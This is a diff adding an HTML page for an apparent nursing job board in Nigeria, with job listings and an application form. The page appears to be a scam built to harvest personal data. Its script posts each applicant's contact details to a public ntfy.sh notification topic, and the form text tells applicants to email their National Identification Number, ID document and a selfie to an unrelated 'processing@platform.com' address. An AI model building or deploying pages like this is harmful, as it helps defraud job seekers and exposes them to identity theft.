@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nursing Careers Platform</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+
+    header {
+      background-color: #0073e6;
+      color: white;
+      text-align: center;
+      padding: 1.5rem;
+    }
+
+    nav {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      background-color: #005bb5;
+      padding: 1rem;
+    }
+
+    nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      font-size: 1rem;
+    }
+
+    section {
+      display: none;
+      padding: 2rem;
+    }
+
+    section.active {
+      display: block;
+    }
+
+    h1, h2 {
+      text-align: center;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background: #0073e6;
+      color: white;
+      text-decoration: none;
+      border-radius: 5px;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .job-listing {
+      border: 1px solid #ccc;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      border-radius: 5px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .job-listing img {
+      width: 100px;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+
+    .job-code {
+      font-size: 1.2rem;
+      color: #005bb5;
+      font-weight: bold;
+    }
+
+    form {
+      max-width: 600px;
+      margin: auto;
+      background: white;
+      padding: 1.5rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+    }
+
+    input, textarea, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 1.5rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      background: #0073e6;
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      padding: 10px;
+    }
+
+    ul {
+      padding-left: 20px;
+    }
+
+    ul li {
+      margin-bottom: 0.5rem;
+    }
+
+    footer {
+      background-color: #005bb5;
+      color: white;
+      text-align: center;
+      padding: 1rem;
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Nursing Careers Platform</h1>
+    <p>Your Gateway to Nursing Opportunities</p>
+  </header>
+
+  <nav>
+    <a href="#" data-target="home">Home</a>
+    <a href="#" data-target="about">About Us</a>
+    <a href="#" data-target="jobs">Jobs</a>
+    <a href="#" data-target="apply">Apply</a>
+    <a href="#" data-target="contact">Contact Us</a>
+  </nav>
+
+  <!-- Home Section -->
+  <section id="home" class="active">
+    <h2>Welcome to Nursing Careers</h2>
+    <p>We connect nursing students and professionals to life-changing job opportunities.</p>
+    <a href="#" class="btn" data-target="jobs">Explore Jobs</a>
+  </section>
+
+  <!-- About Section -->
+  <section id="about">
+    <h2>About Us</h2>
+    <p>We specialize in helping nursing students and professionals secure rewarding career opportunities in the healthcare industry. Our mission is to bridge the gap between talent and opportunity while empowering nurses to thrive in their roles.</p>
+  </section>
+
+  <!-- Jobs Section -->
+  <section id="jobs">
+    <h2>Available Jobs</h2>
+    <div id="job-listings">
+      <!-- Job listings with codes will be dynamically inserted -->
+    </div>
+  </section>
+
+  <!-- Apply Section -->
+  <section id="apply">
+    <h2>Application Form</h2>
+    <form id="application-form">
+      <label for="job-code">Job Code (6 digits from the job listing):</label>
+      <input type="text" id="job-code" name="jobCode" required>
+
+      <label for="full-name">Full Name:</label>
+      <input type="text" id="full-name" name="fullName" required>
+
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="phone">Phone Number:</label>
+      <input type="tel" id="phone" name="phone" required>
+
+      <label for="experience">Why are you interested in this role?</label>
+      <textarea id="experience" name="experience" rows="4" required></textarea>
+
+      <p><strong>After submitting the form, please email the following documents:</strong></p>
+      <ul>
+        <li>Your National Identification Number (NIN)</li>
+        <li>Proof of Identity (e.g., School ID, Passport)</li>
+        <li>A selfie for verification</li>
+      </ul>
+      <p>Send these to: <strong>processing@platform.com</strong></p>
+
+      <button type="submit">Submit Application</button>
+    </form>
+  </section>
+
+  <!-- Contact Section -->
+  <section id="contact">
+    <h2>Contact Us</h2>
+    <p>If you have any questions, feel free to reach out to us:</p>
+    <p>Email: support@nursingcareers.com</p>
+    <p>Phone: +234 123 456 7890</p>
+    <p>Address: 123 Nursing Careers Street, Lagos, Nigeria</p>
+  </section>
+
+  <footer>
+    <p>&copy; 2025 Nursing Careers Platform</p>
+  </footer>
+
+  <script>
+    // Navigation
+    const navLinks = document.querySelectorAll('nav a');
+    const sections = document.querySelectorAll('section');
+
+    navLinks.forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const targetId = link.getAttribute('data-target');
+
+        sections.forEach(section => section.classList.remove('active'));
+        document.getElementById(targetId).classList.add('active');
+      });
+    });
+
+    // Job Listings with Codes and Images
+    const jobs = [
+      { id: 1, title: "Registered Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image1.jpg", code: "RN1234" },
+      { id: 2, title: "Community Health Nurse", location: "Abuja, Nigeria", type: "Internship", image: "image2.jpg", code: "CH5678" },
+      { id: 3, title: "Critical Care Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image3.jpg", code: "CC9101" },
+      { id: 4, title: "Surgical Nurse", location: "Abuja, Nigeria", type: "Full-time", image: "image4.jpg", code: "SN2345" },
+      { id: 5, title: "Pediatric Nurse", location: "Ibadan, Nigeria", type: "Internship", image: "image5.jpg", code: "PN6789" },
+      { id: 6, title: "Oncology Nurse", location: "Enugu, Nigeria", type: "Full-time", image: "image6.jpg", code: "ON3456" },
+      { id: 7, title: "Dialysis Nurse", location: "Lagos, Nigeria", type: "Part-time", image: "image7.jpg", code: "DN7890" },
+      { id: 8, title: "School Nurse", location: "Port Harcourt, Nigeria", type: "Internship", image: "image8.jpg", code: "SN4567" },
+      { id: 9, title: "Psychiatric Nurse", location: "Abuja, Nigeria", type: "Full-time", image: "image9.jpg", code: "PN8910" },
+      { id: 10, title: "Labor and Delivery Nurse", location: "Lagos, Nigeria", type: "Full-time", image: "image10.jpg", code: "LD2345" }
+    ];
+
+    const jobListingsContainer = document.getElementById('job-listings');
+
+    jobs.forEach(job => {
+      const jobDiv = document.createElement('div');
+      jobDiv.className = 'job-listing';
+      jobDiv.innerHTML = `
+        <img src="images/${job.image}" alt="${job.title}">
+        <div>
+          <h3>${job.title}</h3>
+          <p><strong>Location:</strong> ${job.location}</p>
+          <p><strong>Type:</strong> ${job.type}</p>
+          <span class="job-code">Code: ${job.code}</span>
+        </div>
+        <a href="#" class="btn" data-target="apply">Apply Now</a>
+      `;
+      jobListingsContainer.appendChild(jobDiv);
+    });
+
+    // Form Submission
+    const form = document.getElementById('application-form');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const data = {};
+      formData.forEach((value, key) => {
+        data[key] = value;
+      });
+
+      fetch('https://ntfy.sh/your-topic', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+        .then(response => {
+          if (response.ok) {
+            alert('Application submitted successfully!');
+            form.reset();
+            sections.forEach(section => section.classList.remove('active'));
+            document.getElementById('home').classList.add('active');
+          } else {
+            alert('Error submitting your application. Please try again.');
+          }
+        })
+        .catch(error => console.error('Error:', error));
+    });
+  </script>
+</body>
+</html>
+
